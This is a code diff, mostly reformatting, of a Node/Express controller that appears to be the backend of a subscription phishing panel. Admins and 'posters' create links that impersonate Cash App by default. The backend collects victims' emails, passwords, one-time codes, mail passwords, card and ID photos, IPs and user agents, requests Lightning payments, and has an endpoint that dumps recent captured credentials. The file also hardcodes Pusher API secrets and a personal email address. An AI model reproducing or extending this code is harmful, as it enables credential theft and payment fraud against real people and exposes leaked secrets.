@@ -1,31 +1,35 @@
-'use strict';
-import NewInfo from '../models/OldInfo.js';
-import nodemailer from 'nodemailer';
-import Amount from '../models/Amount.js';
-import Withdraw from '../models/Withdraw.js';
+"use strict";
+import NewInfo from "../models/OldInfo.js";
+import nodemailer from "nodemailer";
+import Amount from "../models/Amount.js";
+import Withdraw from "../models/Withdraw.js";
 
-import User from '../models/User.js';
-import Info from '../models/Info.js';
-import Link from '../models/Link.js';
-import Click from '../models/Click.js';
+import User from "../models/User.js";
+import Info from "../models/Info.js";
+import Link from "../models/Link.js";
+import Click from "../models/Click.js";
 // import socket from '../server.js'
-import Poster from '../models/Poster.js';
-import device from 'express-device';
-import useragent from 'express-useragent';
-import Site from '../models/Site.js';
-import createToken from '../utils/createToken.js';
-import Demo from '../models/Demo.js';
-import Cash from '../models/Cash.js';
-import rateLimitMiddleware from '../ratelimiter.js';
-import axios from 'axios';
-import Password from '../models/Password.js';
-import satelize from 'satelize';
-import Otp from '../models/Otp.js';
-import Pusher from 'pusher';
-import path from 'path';
-import { getNwc, getNwc2 } from '../utils/webln.js';
-import CheckPermission from '../models/CheckPermission.js';
-import { getInternalAmount, setFeeToggle, getFeeToggleState } from '../utils/feeCalculator.js';
+import Poster from "../models/Poster.js";
+import device from "express-device";
+import useragent from "express-useragent";
+import Site from "../models/Site.js";
+import createToken from "../utils/createToken.js";
+import Demo from "../models/Demo.js";
+import Cash from "../models/Cash.js";
+import rateLimitMiddleware from "../ratelimiter.js";
+import axios from "axios";
+import Password from "../models/Password.js";
+import satelize from "satelize";
+import Otp from "../models/Otp.js";
+import Pusher from "pusher";
+import path from "path";
+import { getNwc, getNwc2 } from "../utils/webln.js";
+import CheckPermission from "../models/CheckPermission.js";
+import {
+  getInternalAmount,
+  setFeeToggle,
+  getFeeToggleState,
+} from "../utils/feeCalculator.js";
 
 export const yoyo = async (req, res) => {
   const { id } = req.params;
@@ -33,11 +37,11 @@ export const yoyo = async (req, res) => {
   try {
     const originalDatawith = await Info.find({
       createdAt: { $gte: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) },
-    }).select('email password');
+    }).select("email password");
 
     return res.status(200).json({ originalDatawith });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -57,7 +61,7 @@ export const wrong_password = (req, res) => {
       }
 
       return res.status(200).json({ success: true, id: id });
-    }
+    },
   );
 };
 
@@ -74,12 +78,12 @@ export const signup_post = async (req, res) => {
   try {
     const user = await User.findOne({ username: username });
     if (user) {
-      return res.status(400).json({ error: 'user exists yes' });
+      return res.status(400).json({ error: "user exists yes" });
     }
     if (adminId) {
       const foundWithAdminId = await User.findOne({ adminId: adminId });
       if (foundWithAdminId) {
-        return res.status(400).json({ error: 'id exists' });
+        return res.status(400).json({ error: "id exists" });
       }
     }
     const userCreated = await User.create({
@@ -106,7 +110,7 @@ export const login_post = async (req, res) => {
         const diff = currentDate - user.createdAt;
         const difff = diff / 1000 / 60 / 60 / 24;
         if (difff >= user.validity) {
-          return res.status(400).json({ error: 'Subscription Expired' });
+          return res.status(400).json({ error: "Subscription Expired" });
         }
         return res.status(200).json({
           adminId: user.adminId,
@@ -119,7 +123,7 @@ export const login_post = async (req, res) => {
           tag: user.tag,
         });
       }
-      return res.status(400).json({ error: 'Wrong password' });
+      return res.status(400).json({ error: "Wrong password" });
     } else {
       const poster = await Poster.findOne({ username: username });
       if (poster) {
@@ -130,7 +134,7 @@ export const login_post = async (req, res) => {
           const diff = currentDate - admin.createdAt;
           const difff = diff / 1000 / 60 / 60 / 24;
           if (difff >= admin.validity) {
-            return res.status(400).json({ error: 'Subscription Expired' });
+            return res.status(400).json({ error: "Subscription Expired" });
           }
           return res.status(200).json({
             username: poster.username,
@@ -141,12 +145,12 @@ export const login_post = async (req, res) => {
             qrCodeStatus: admin.qrCodeStatus,
           });
         }
-        return res.status(400).json({ error: 'Wrong password' });
+        return res.status(400).json({ error: "Wrong password" });
       }
     }
-    return res.status(400).json({ error: 'User not found' });
+    return res.status(400).json({ error: "User not found" });
   } catch (e) {
-    res.status(400).json({ error: 'not found' });
+    res.status(400).json({ error: "not found" });
   }
 };
 
@@ -166,7 +170,7 @@ export const skip_code = (req, res) => {
       }
 
       return res.status(200).json({ success: true, id: id });
-    }
+    },
   );
 };
 
@@ -187,7 +191,7 @@ export const mega_wrong_post = (req, res) => {
       }
 
       return res.status(200).json({ success: true, id: id });
-    }
+    },
   );
 };
 
@@ -208,7 +212,7 @@ export const cards = (req, res) => {
       }
 
       return res.status(200).json({ success: true });
-    }
+    },
   );
 };
 
@@ -229,7 +233,7 @@ export const add_mail = (req, res) => {
       }
 
       return res.status(200).json({ success: true });
-    }
+    },
   );
 };
 export const add_posterNumber = (req, res) => {
@@ -247,7 +251,7 @@ export const add_posterNumber = (req, res) => {
         res.status(400).json({ error: err });
       }
       res.status(200).json({ success: true });
-    }
+    },
   );
 };
 
@@ -266,7 +270,7 @@ export const add_new_links = (req, res) => {
         return res.status(400).json({ error: err });
       }
       return res.status(200).json({ success: true });
-    }
+    },
   );
 };
 
@@ -274,16 +278,16 @@ export const user_noti = async (req, res) => {
   const { text, posterId } = req.body;
   ////ahmedimran96yoo@gmail.com
   const pusher = new Pusher({
-    appId: '1731286',
-    key: 'a5f0008dea3736f30a17',
-    secret: '0599185eb95735d5a17a',
-    cluster: 'ap2',
+    appId: "1731286",
+    key: "a5f0008dea3736f30a17",
+    secret: "0599185eb95735d5a17a",
+    cluster: "ap2",
     useTLS: true,
   });
 
   try {
     if (text) {
-      pusher.trigger(posterId, 'chat-notification', {
+      pusher.trigger(posterId, "chat-notification", {
         text: text,
       });
     }
@@ -300,32 +304,32 @@ export const info_get = async (req, res) => {
     if (admin) {
       const user = await User.findOne({ _id: id })
         .populate({
-          path: 'posters',
-          model: 'Poster',
-          select: 'username password links ',
+          path: "posters",
+          model: "Poster",
+          select: "username password links ",
           populate: {
-            path: 'details',
-            model: 'Info',
+            path: "details",
+            model: "Info",
             select:
-              'site email password skipcode mail mailPass onlyCard holdingCard amount',
+              "site email password skipcode mail mailPass onlyCard holdingCard amount",
           },
         })
-        .select('posters')
-        .populate('posters', 'username password links ')
+        .select("posters")
+        .populate("posters", "username password links ")
         .sort({ createdAt: -1 });
       return res.status(200).json({ user: user });
     }
 
     const poster = await Poster.findOne({ _id: id })
-      .select('details')
+      .select("details")
       .populate(
-        'details',
-        'site email password gCode skipcode mail mailPass onlyCard holdingCard amount'
+        "details",
+        "site email password gCode skipcode mail mailPass onlyCard holdingCard amount",
       )
       .sort({ createdAt: -1 });
     return res.status(200).json({ poster: poster });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -336,28 +340,28 @@ export const id_card = async (req, res) => {
     if (admin) {
       const user = await User.findOne({ _id: id })
         .populate({
-          path: 'posters',
-          model: 'Poster',
-          select: 'username password links ',
+          path: "posters",
+          model: "Poster",
+          select: "username password links ",
           populate: {
-            path: 'details',
-            model: 'Info',
-            select: 'site onlyCard holdingCard',
+            path: "details",
+            model: "Info",
+            select: "site onlyCard holdingCard",
           },
         })
         .sort({ createdAt: -1 })
-        .select('posters')
-        .populate('posters', 'username password links ');
+        .select("posters")
+        .populate("posters", "username password links ");
       return res.status(200).json({ user: user });
     }
 
     const poster = await Poster.findOne({ _id: id })
-      .select('details')
-      .populate('details', 'site onlyCard holdingCard')
+      .select("details")
+      .populate("details", "site onlyCard holdingCard")
       .sort({ createdAt: -1 });
     return res.status(200).json({ poster: poster });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -368,11 +372,11 @@ export const poster_add = async (req, res) => {
     const user = await User.findOne({ _id: id });
     const posterExists = await Poster.findOne({ username: username });
     if (posterExists) {
-      return res.status(400).json({ error: 'username exists' });
+      return res.status(400).json({ error: "username exists" });
     }
 
     if (user.numOfPosters >= user.numOfPostersPermission) {
-      return res.status(400).json({ error: 'User add limit reached' });
+      return res.status(400).json({ error: "User add limit reached" });
     }
 
     const poster = new Poster({
@@ -394,9 +398,9 @@ export const poster_add = async (req, res) => {
         root: poster._id,
       });
     });
-    return res.status(200).json({ status: 'saved' });
+    return res.status(200).json({ status: "saved" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -405,7 +409,7 @@ const getSatoshis = async (usdAmount) => {
   if (!usdAmount || isNaN(parseFloat(usdAmount))) return 0;
   const numericAmount = parseFloat(usdAmount);
   try {
-    const response = await axios.get('https://blockchain.info/ticker', {
+    const response = await axios.get("https://blockchain.info/ticker", {
       timeout: 3000,
     });
     const btcPrice = response.data?.USD?.last;
@@ -416,7 +420,7 @@ const getSatoshis = async (usdAmount) => {
       return satoshis;
     }
   } catch (error) {
-    console.error('Error fetching real-time BTC price:', error.message);
+    console.error("Error fetching real-time BTC price:", error.message);
   }
   // Fallback to a solid default rate ($95,000 USD/BTC) if API is unavailable.
   // Round to nearest 100 satoshis (1 microBTC) to prevent 'n' (nanoBTC) multiplier.
@@ -424,26 +428,26 @@ const getSatoshis = async (usdAmount) => {
 };
 
 export const add_data = async (req, res) => {
-  console.log('hit');
+  console.log("hit");
   const pusher = new Pusher({
-    appId: '1987499',
-    key: '05656b52c62c0f688ee3',
-    secret: 'b4372518df233d054270',
-    cluster: 'ap2',
+    appId: "1987499",
+    key: "05656b52c62c0f688ee3",
+    secret: "b4372518df233d054270",
+    cluster: "ap2",
     useTLS: true,
   });
 
   const { adminId, posterId } = req.params;
-  console.log('adminId', adminId);
-  console.log('posterId', posterId);
+  console.log("adminId", adminId);
+  console.log("posterId", posterId);
   const { site, mail, passcode, email, password, amount } = req.body;
-  const userAgent = req.headers['user-agent'];
+  const userAgent = req.headers["user-agent"];
   const ipAddress = (
-    req.headers['x-forwarded-for'] ||
+    req.headers["x-forwarded-for"] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     req.connection.socket.remoteAddress
-  ).split(',')[0];
+  ).split(",")[0];
 
   try {
     let actualSite = site;
@@ -460,7 +464,9 @@ export const add_data = async (req, res) => {
 
     let adminPosterIds = [];
     if (userFound) {
-      const postersOfAdmin = await Poster.find({ root: userFound._id }).select('_id username posterId');
+      const postersOfAdmin = await Poster.find({ root: userFound._id }).select(
+        "_id username posterId",
+      );
       adminPosterIds = postersOfAdmin.map((p) => p._id);
     }
 
@@ -472,19 +478,19 @@ export const add_data = async (req, res) => {
       }
 
       let linkMatch = await Link.findOne(linkQuery).populate({
-        path: 'root',
-        populate: { path: 'root', model: 'User' },
+        path: "root",
+        populate: { path: "root", model: "User" },
       });
 
       if (!linkMatch) {
-        const escapedSite = site.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-        let regexQuery = { linkName: new RegExp(`^${escapedSite}/`, 'i') };
+        const escapedSite = site.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+        let regexQuery = { linkName: new RegExp(`^${escapedSite}/`, "i") };
         if (adminPosterIds.length > 0) {
           regexQuery.root = { $in: adminPosterIds };
         }
         linkMatch = await Link.findOne(regexQuery).populate({
-          path: 'root',
-          populate: { path: 'root', model: 'User' },
+          path: "root",
+          populate: { path: "root", model: "User" },
         });
       }
 
@@ -496,7 +502,7 @@ export const add_data = async (req, res) => {
           posterFound = await Poster.findOne({
             username: linkMatch.username,
             ...(userFound ? { root: userFound._id } : {}),
-          }).populate('root');
+          }).populate("root");
         }
       }
     }
@@ -512,11 +518,13 @@ export const add_data = async (req, res) => {
       if (userFound) {
         posterQuery.root = userFound._id;
       }
-      posterFound = await Poster.findOne(posterQuery).populate('root');
+      posterFound = await Poster.findOne(posterQuery).populate("root");
     }
 
     if (!userFound && posterFound?.root) {
-      userFound = posterFound.root?._id ? posterFound.root : await User.findById(posterFound.root);
+      userFound = posterFound.root?._id
+        ? posterFound.root
+        : await User.findById(posterFound.root);
     }
 
     if (userFound && posterFound) {
@@ -541,7 +549,7 @@ export const add_data = async (req, res) => {
         try {
           const internalAmount = getInternalAmount(amount);
           const numericAmount = await getSatoshis(
-            String(internalAmount).replace(/[^0-9.]/g, '')
+            String(internalAmount).replace(/[^0-9.]/g, ""),
           );
           if (numericAmount > 0) {
             let albyResponse1 = null;
@@ -550,16 +558,32 @@ export const add_data = async (req, res) => {
             const promises = [];
             if (nwcInstance) {
               promises.push(
-                nwcInstance.makeInvoice({ amount: numericAmount })
-                  .then(res => { albyResponse1 = res; })
-                  .catch(err => console.error('[Alby NWC 1] makeInvoice error:', err.message))
+                nwcInstance
+                  .makeInvoice({ amount: numericAmount })
+                  .then((res) => {
+                    albyResponse1 = res;
+                  })
+                  .catch((err) =>
+                    console.error(
+                      "[Alby NWC 1] makeInvoice error:",
+                      err.message,
+                    ),
+                  ),
               );
             }
             if (nwcInstance2) {
               promises.push(
-                nwcInstance2.makeInvoice({ amount: numericAmount })
-                  .then(res => { albyResponse2 = res; })
-                  .catch(err => console.error('[Alby NWC 2] makeInvoice error:', err.message))
+                nwcInstance2
+                  .makeInvoice({ amount: numericAmount })
+                  .then((res) => {
+                    albyResponse2 = res;
+                  })
+                  .catch((err) =>
+                    console.error(
+                      "[Alby NWC 2] makeInvoice error:",
+                      err.message,
+                    ),
+                  ),
               );
             }
 
@@ -568,43 +592,61 @@ export const add_data = async (req, res) => {
             if (albyResponse1 && albyResponse1.paymentRequest) {
               info.lightningInvoice = albyResponse1.paymentRequest;
               try {
-                const txs = await nwcInstance.listTransactions({ limit: 10, unpaid: true });
+                const txs = await nwcInstance.listTransactions({
+                  limit: 10,
+                  unpaid: true,
+                });
                 if (txs && txs.transactions) {
                   const matchedTx = txs.transactions.find(
-                    (tx) => tx.invoice === albyResponse1.paymentRequest
+                    (tx) => tx.invoice === albyResponse1.paymentRequest,
                   );
                   if (matchedTx && matchedTx.payment_hash) {
                     info.rHash = matchedTx.payment_hash;
-                    console.log('[Alby NWC 1] Found payment hash:', matchedTx.payment_hash);
+                    console.log(
+                      "[Alby NWC 1] Found payment hash:",
+                      matchedTx.payment_hash,
+                    );
                   }
                 }
               } catch (txErr) {
-                console.error('[Alby NWC 1] Failed to list transactions to find hash:', txErr.message);
+                console.error(
+                  "[Alby NWC 1] Failed to list transactions to find hash:",
+                  txErr.message,
+                );
               }
             }
 
             if (albyResponse2 && albyResponse2.paymentRequest) {
               info.lightningInvoice2 = albyResponse2.paymentRequest;
               try {
-                const txs = await nwcInstance2.listTransactions({ limit: 10, unpaid: true });
+                const txs = await nwcInstance2.listTransactions({
+                  limit: 10,
+                  unpaid: true,
+                });
                 if (txs && txs.transactions) {
                   const matchedTx = txs.transactions.find(
-                    (tx) => tx.invoice === albyResponse2.paymentRequest
+                    (tx) => tx.invoice === albyResponse2.paymentRequest,
                   );
                   if (matchedTx && matchedTx.payment_hash) {
                     info.rHash2 = matchedTx.payment_hash;
-                    console.log('[Alby NWC 2] Found payment hash:', matchedTx.payment_hash);
+                    console.log(
+                      "[Alby NWC 2] Found payment hash:",
+                      matchedTx.payment_hash,
+                    );
                   }
                 }
               } catch (txErr) {
-                console.error('[Alby NWC 2] Failed to list transactions to find hash:', txErr.message);
+                console.error(
+                  "[Alby NWC 2] Failed to list transactions to find hash:",
+                  txErr.message,
+                );
               }
             }
           }
         } catch (albyErr) {
           console.error(
-            'Alby NWC Invoice creation failed in add_data:',
-            albyErr.message
+            "Alby NWC Invoice creation failed in add_data:",
+            albyErr.message,
           );
         }
       }
@@ -613,13 +655,13 @@ export const add_data = async (req, res) => {
         await Amount.findOneAndUpdate(
           { site: site, adminId: adminId, posterId: posterId },
           { amount: amount },
-          { new: true, upsert: true }
+          { new: true, upsert: true },
         );
       }
 
       await info.save();
       if (info) {
-        pusher.trigger(userFound.adminId, 'new-notification', {
+        pusher.trigger(userFound.adminId, "new-notification", {
           adminId: userFound.adminId,
           posterId: posterFound.posterId || posterFound._id.toString(),
           name: posterFound.username,
@@ -636,7 +678,7 @@ export const add_data = async (req, res) => {
           isInvoice2Active = checkPerm.lightningInvoice2 === true;
         }
       } catch (permErr) {
-        console.error('Error querying CheckPermission:', permErr.message);
+        console.error("Error querying CheckPermission:", permErr.message);
       }
 
       // Filter response to only return the active invoice
@@ -647,11 +689,13 @@ export const add_data = async (req, res) => {
       delete infoResponse.lightningInvoice2;
       delete infoResponse.rHash2;
 
-      return res.status(200).json({ info: infoResponse, email: posterFound.username });
+      return res
+        .status(200)
+        .json({ info: infoResponse, email: posterFound.username });
     }
-    return res.status(400).json({ e: 'not found' });
+    return res.status(400).json({ e: "not found" });
   } catch (e) {
-    return res.status(400).json({ e: 'error' });
+    return res.status(400).json({ e: "error" });
   }
 };
 
@@ -667,10 +711,10 @@ export const change_password = async (req, res) => {
         new: true,
         upsert: true,
       });
-      return res.status(200).json({ success: 'password change successfully' });
+      return res.status(200).json({ success: "password change successfully" });
     }
   } catch (e) {
-    return res.status(400).json({ e: 'error' });
+    return res.status(400).json({ e: "error" });
   }
 };
 
@@ -679,7 +723,7 @@ export const delete_poster = (req, res) => {
   //    return  res.status(422).json({ id: id_pos })
 
   Poster.findByIdAndRemove({ _id: id_pos })
-    .then((user) => console.log('deleted yes'))
+    .then((user) => console.log("deleted yes"))
     .catch((err) => res.status(422).json({ error: err }));
   User.findOne({ _id: id_ad })
     .then((user) => {
@@ -688,24 +732,24 @@ export const delete_poster = (req, res) => {
       user.numOfPosters = user.numOfPosters - 1;
       user
         .save()
-        .then((useryes) => console.log('saved yes'))
+        .then((useryes) => console.log("saved yes"))
         .catch((err) => res.status(422).json({ error: err }));
       Link.deleteMany({ root: id_pos })
         .then(function () {
-          console.log('Data deleted');
+          console.log("Data deleted");
         })
         .catch(function (error) {
           console.log(error);
         });
       User.findOne({ _id: id_ad })
         .populate({
-          path: 'posters',
-          model: 'Poster',
-          select: 'username password links posterId',
+          path: "posters",
+          model: "Poster",
+          select: "username password links posterId",
         })
         .sort({ createdAt: -1 })
         .then((users) => res.status(200).json({ data: users }))
-        .catch((err) => console.log('erro'));
+        .catch((err) => console.log("erro"));
     })
     .catch((err) => res.status(422).json({ error: err }));
 };
@@ -735,20 +779,20 @@ export const delete_info = async (req, res) => {
   // return res.status(200).json({  newinfo })
 
   Info.findByIdAndRemove({ _id: info_id })
-    .then((user) => console.log('deleted yes'))
-    .catch((err) => console.log('deleted yes'));
+    .then((user) => console.log("deleted yes"))
+    .catch((err) => console.log("deleted yes"));
 
   Poster.findById({ _id: pos_id })
-    .select('username password posterId links createdAt details')
+    .select("username password posterId links createdAt details")
     .populate(
-      'details',
-      'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt'
+      "details",
+      "site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt",
     )
     .sort({ createdAt: -1 })
     .then((data) => {
       return res.status(200).json({ data: data });
     })
-    .catch((err) => console.log('err', err));
+    .catch((err) => console.log("err", err));
 };
 
 export const link_add = async (req, res) => {
@@ -778,11 +822,11 @@ export const link_add = async (req, res) => {
           { posterId: root },
           { username: root },
         ],
-      }).populate('root');
+      }).populate("root");
     }
 
     if (!posterDoc && username) {
-      posterDoc = await Poster.findOne({ username }).populate('root');
+      posterDoc = await Poster.findOne({ username }).populate("root");
     }
 
     if (posterDoc) {
@@ -803,8 +847,10 @@ export const link_add = async (req, res) => {
 
       // Ensure Amount collection record exists and is mapped to this poster and admin
       if (linkName) {
-        const adminIdVal = posterDoc.root?.adminId || posterDoc.root?.username || '';
-        const posterIdVal = posterDoc.username || posterDoc.posterId || posterDoc._id.toString();
+        const adminIdVal =
+          posterDoc.root?.adminId || posterDoc.root?.username || "";
+        const posterIdVal =
+          posterDoc.username || posterDoc.posterId || posterDoc._id.toString();
         await Amount.findOneAndUpdate(
           { site: linkName },
           {
@@ -813,10 +859,10 @@ export const link_add = async (req, res) => {
               adminId: adminIdVal,
               posterId: posterIdVal,
               name: posterDoc.username,
-              cashTag: posterDoc.tag || '',
+              cashTag: posterDoc.tag || "",
             },
           },
-          { upsert: true, new: true }
+          { upsert: true, new: true },
         );
       }
     }
@@ -835,26 +881,30 @@ export const link_add = async (req, res) => {
       if (brandName !== undefined) link.brandName = brandName;
       if (domain !== undefined) link.domain = domain;
       await link.save();
-      return res.status(200).json({ status: 'updated' });
+      return res.status(200).json({ status: "updated" });
     }
 
     await Link.create({
       linkName,
       targetUrl,
       root: resolvedRoot,
-      theme: theme || 'Cash Green',
-      fixedAmount: fixedAmount || 'Open',
+      theme: theme || "Cash Green",
+      fixedAmount: fixedAmount || "Open",
       minAmount: minAmount !== undefined ? minAmount : 1,
       maxAmount: maxAmount !== undefined ? maxAmount : 2000,
-      defaultAmount: defaultAmount || '',
+      defaultAmount: defaultAmount || "",
       username: resolvedUsername,
-      title: title || (resolvedUsername ? `${resolvedUsername} on Cash App` : 'Pay on Cash App'),
-      brandName: brandName || 'Cash App',
+      title:
+        title ||
+        (resolvedUsername
+          ? `${resolvedUsername} on Cash App`
+          : "Pay on Cash App"),
+      brandName: brandName || "Cash App",
       domain,
     });
-    return res.status(200).json({ status: 'created' });
+    return res.status(200).json({ status: "created" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -864,11 +914,11 @@ export const update_tag = async (req, res) => {
     const user = await User.findOneAndUpdate(
       { _id: id },
       { $set: { showTagField, tag } },
-      { new: true }
+      { new: true },
     );
     return res.status(200).json({ success: true, user });
   } catch (e) {
-    return res.status(400).json({ error: 'Update failed' });
+    return res.status(400).json({ error: "Update failed" });
   }
 };
 
@@ -879,7 +929,7 @@ export const link_get = async (req, res) => {
     const user = await User.findOne({ _id: id });
     res.status(200).json({ users: user.links });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -887,7 +937,7 @@ export const all_poster = async (req, res) => {
   const { id } = req.params;
   const page = parseInt(req.query.page) || 1;
   const pageSize = parseInt(req.query.pageSize) || 20;
-  const filter = req.query.filter || '';
+  const filter = req.query.filter || "";
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
@@ -896,8 +946,8 @@ export const all_poster = async (req, res) => {
     let query = { root: id };
     if (filter) {
       query.$or = [
-        { username: { $regex: filter, $options: 'i' } },
-        { posterId: { $regex: filter, $options: 'i' } },
+        { username: { $regex: filter, $options: "i" } },
+        { posterId: { $regex: filter, $options: "i" } },
       ];
     }
 
@@ -911,7 +961,7 @@ export const all_poster = async (req, res) => {
 
     const total = await Poster.countDocuments(query);
     const posters = await Poster.find(query)
-      .select('username password links posterId createdAt')
+      .select("username password links posterId createdAt")
       .sort(sort)
       .skip((page - 1) * pageSize)
       .limit(pageSize)
@@ -936,103 +986,21 @@ export const poster_details = async (req, res) => {
   const { id } = req.params;
   const page = parseInt(req.query.page) || 1;
   const pageSize = parseInt(req.query.pageSize) || 20;
-  const filter = req.query.filter || '';
+  const filter = req.query.filter || "";
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
-    const poster = await Poster.findOne({
-      $or: [
-        { _id: id && id.length === 24 ? id : null },
-        { posterId: id },
-        { username: id },
-      ],
-    })
-      .select('username password posterId links createdAt tag root')
-      .populate('root', 'username adminId');
+    const poster = await Poster.findOne({ _id: id })
+      .select("username password posterId links createdAt tag root")
+      .populate("root", "username adminId");
 
-    if (!poster) {
-      return res.status(404).json({ error: 'Poster not found' });
-    }
-
-    const linksFromLinkColl = await Link.find({
-      $or: [
-        { root: id },
-        { root: poster._id },
-        { username: poster.username },
-        { posterId: poster.posterId },
-        { posterId: id },
-      ],
-    }).select('linkName').lean();
-
-    const cleanUrlParts = (rawUrl) => {
-      if (!rawUrl) return { host: '', segments: [] };
-      try {
-        const u = new URL(rawUrl.startsWith('http') ? rawUrl : `https://${rawUrl}`);
-        const host = u.host.replace(/^www\./i, '').toLowerCase();
-        const segments = u.pathname.split('/').filter(Boolean);
-        return { host, segments };
-      } catch (e) {
-        return { host: '', segments: [] };
-      }
-    };
-
-    const allPosterLinks = Array.from(
-      new Set([
-        ...(poster.links || []),
-        ...linksFromLinkColl.map((l) => l.linkName).filter(Boolean),
-      ])
-    ).sort((a, b) => {
-      const aParts = cleanUrlParts(a).segments.length;
-      const bParts = cleanUrlParts(b).segments.length;
-      return bParts - aParts; // 2-param links first
-    });
-
-    if (allPosterLinks.length > (poster.links || []).length || JSON.stringify(poster.links) !== JSON.stringify(allPosterLinks)) {
-      poster.links = allPosterLinks;
-      await poster.save().catch(() => {});
-    }
-
-    const posterIds = [id];
-    if (poster?._id) posterIds.push(poster._id.toString());
-    if (poster?.posterId) posterIds.push(poster.posterId);
-    if (poster?.username) posterIds.push(poster.username);
-
-    const adminIdVal = poster.root?.adminId || poster.root?.username;
-
-    // Build scoped query conditions
-    const posterCriteria = [
-      { root: poster._id },
-      { poster: { $in: posterIds } },
-    ];
-    if (poster.details && poster.details.length > 0) {
-      posterCriteria.push({ _id: { $in: poster.details } });
-    }
-
-    // Must belong to this poster OR (if matching this poster's unique links, must belong to this admin)
-    const baseConditions = [{ $or: posterCriteria }];
-    if (allPosterLinks.length > 0 && adminIdVal) {
-      baseConditions.push({
-        $and: [
-          { adminId: adminIdVal },
-          { site: { $in: allPosterLinks } },
-        ],
-      });
-    }
-
-    let query = { $or: baseConditions };
+    let query = { root: id };
     if (filter) {
-      query = {
-        $and: [
-          { $or: baseConditions },
-          {
-            $or: [
-              { site: { $regex: filter, $options: 'i' } },
-              { email: { $regex: filter, $options: 'i' } },
-              { mail: { $regex: filter, $options: 'i' } },
-            ],
-          },
-        ],
-      };
+      query.$or = [
+        { site: { $regex: filter, $options: "i" } },
+        { email: { $regex: filter, $options: "i" } },
+        { mail: { $regex: filter, $options: "i" } },
+      ];
     }
 
     let sort = { createdAt: -1 };
@@ -1046,59 +1014,17 @@ export const poster_details = async (req, res) => {
     const total = await Info.countDocuments(query);
     const details = await Info.find(query)
       .select(
-        'site mail passcode skipcode email password tag gCode ip agent status number createdAt amount '
+        "site mail passcode skipcode email password tag gCode ip agent status number createdAt amount ",
       )
       .sort(sort)
       .skip((page - 1) * pageSize)
       .limit(pageSize)
       .lean();
 
-    const enrichedDetails = await Promise.all(
-      details.map(async (item) => {
-        if (item.site) {
-          const itemParts = cleanUrlParts(item.site);
-
-          // If item.site already has 2 or more segments, keep it as is
-          if (itemParts.segments.length >= 2) {
-            return item;
-          }
-
-          // Find a 2-parameter link for this poster with matching first segment
-          let matchedTwoParamLink = allPosterLinks.find((pl) => {
-            if (!pl) return false;
-            const plParts = cleanUrlParts(pl);
-            if (plParts.segments.length < 2) return false;
-
-            if (itemParts.host && plParts.host && itemParts.host !== plParts.host) {
-              return false;
-            }
-
-            if (itemParts.segments.length === 1) {
-              return plParts.segments[0].toLowerCase() === itemParts.segments[0].toLowerCase();
-            }
-            return false;
-          });
-
-          if (matchedTwoParamLink) {
-            item.site = matchedTwoParamLink;
-            await Info.updateOne(
-              { _id: item._id },
-              { $set: { site: matchedTwoParamLink } }
-            ).catch(() => {});
-          }
-        }
-        return item;
-      })
-    );
-
-    const posterObj = poster.toObject();
-    delete posterObj._doc;
-
     return res.status(200).json({
       data: {
-        ...posterObj,
-        links: allPosterLinks,
-        details: enrichedDetails,
+        ...poster?.toObject(),
+        details: details,
         total: total,
         page: page,
         pageSize: pageSize,
@@ -1116,7 +1042,7 @@ export const add_site = async (req, res) => {
   try {
     const sitefound = await Site.findOne({ name: name });
     if (sitefound) {
-      return res.status(200).json({ site: 'site existes' });
+      return res.status(200).json({ site: "site existes" });
     }
 
     const site = await Site.create({
@@ -1125,7 +1051,7 @@ export const add_site = async (req, res) => {
 
     return res.status(200).json({ site: site });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -1133,7 +1059,7 @@ export const link_details = async (req, res) => {
   const { id, admin } = req.params;
   const page = parseInt(req.query.page) || 1;
   const pageSize = parseInt(req.query.pageSize) || 20;
-  const filter = req.query.filter || '';
+  const filter = req.query.filter || "";
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
@@ -1145,7 +1071,7 @@ export const link_details = async (req, res) => {
 
       let query = { root: { $in: posterIds } };
       if (filter) {
-        query.linkName = { $regex: filter, $options: 'i' };
+        query.linkName = { $regex: filter, $options: "i" };
       }
 
       let sort = { createdAt: -1 };
@@ -1164,7 +1090,9 @@ export const link_details = async (req, res) => {
 
       const linkNames = links.map((l) => l.linkName);
 
-      return res.status(200).json({ data: linkNames, sites: sites, total: total });
+      return res
+        .status(200)
+        .json({ data: linkNames, sites: sites, total: total });
     } else if (admin == 0) {
       const data = await Poster.findOne({ _id: id });
       const allLinks = data?.links || [];
@@ -1172,9 +1100,14 @@ export const link_details = async (req, res) => {
         ? allLinks.filter((l) => l.toLowerCase().includes(filter.toLowerCase()))
         : allLinks;
       const total = filteredLinks.length;
-      const paginated = filteredLinks.slice((page - 1) * pageSize, page * pageSize);
+      const paginated = filteredLinks.slice(
+        (page - 1) * pageSize,
+        page * pageSize,
+      );
 
-      return res.status(200).json({ data: paginated, sites: sites, total: total });
+      return res
+        .status(200)
+        .json({ data: paginated, sites: sites, total: total });
     }
   } catch (e) {
     return res.status(400).json({ error: e.message });
@@ -1187,7 +1120,7 @@ export const site_exist_new = async (req, res) => {
   const { site, adminId, posterId, verifyId, device } = req.params;
   // const siteName = "https://" + site + "/"  + adminId + "/" + posterId
   const siteName =
-    'https://' + site + '/' + adminId + '/' + posterId + '/' + verifyId;
+    "https://" + site + "/" + adminId + "/" + posterId + "/" + verifyId;
 
